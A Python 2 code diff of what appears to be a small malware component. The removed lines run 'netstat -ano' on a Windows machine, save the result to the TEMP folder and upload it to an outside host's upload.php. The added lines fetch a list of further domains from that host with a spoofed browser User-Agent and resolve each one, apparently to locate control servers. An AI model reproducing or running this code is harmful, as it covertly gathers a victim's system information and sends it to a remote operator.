@@ -1,12 +1,14 @@
 import subprocess
 import requests
 import os
-site="config01.homepc.it"
-sdump=subprocess.check_output("netstat -ano",stderr=subprocess.STDOUT, shell=True)
-sCOMPUTERNAME="pippo"
-text_file = open(os.getenv('TEMP')+"\\" + sCOMPUTERNAME, "w")
-text_file.write(sdump)
-text_file.close()
-files = {'userfile': open(os.getenv('TEMP')+"\\" + sCOMPUTERNAME, 'rb')}
-r = requests.post('http://' + site +'/upload.php',files=files)    
-print sdump
+import socket
+
+header = {'User-Agent': 'Mozilla/5.0'}
+ip=socket.gethostbyname('config01.homepc.it')
+sites = ["paner.altervista.org"]#, mainsite.text]
+mainsite = requests.get("http://"+ip+"/site.txt", headers=header)
+for mysite in mainsite.text.split(","):
+    print socket.gethostbyname(mysite)
+    sites.append(socket.gethostbyname(mysite))
+for site in sites:
+    print site
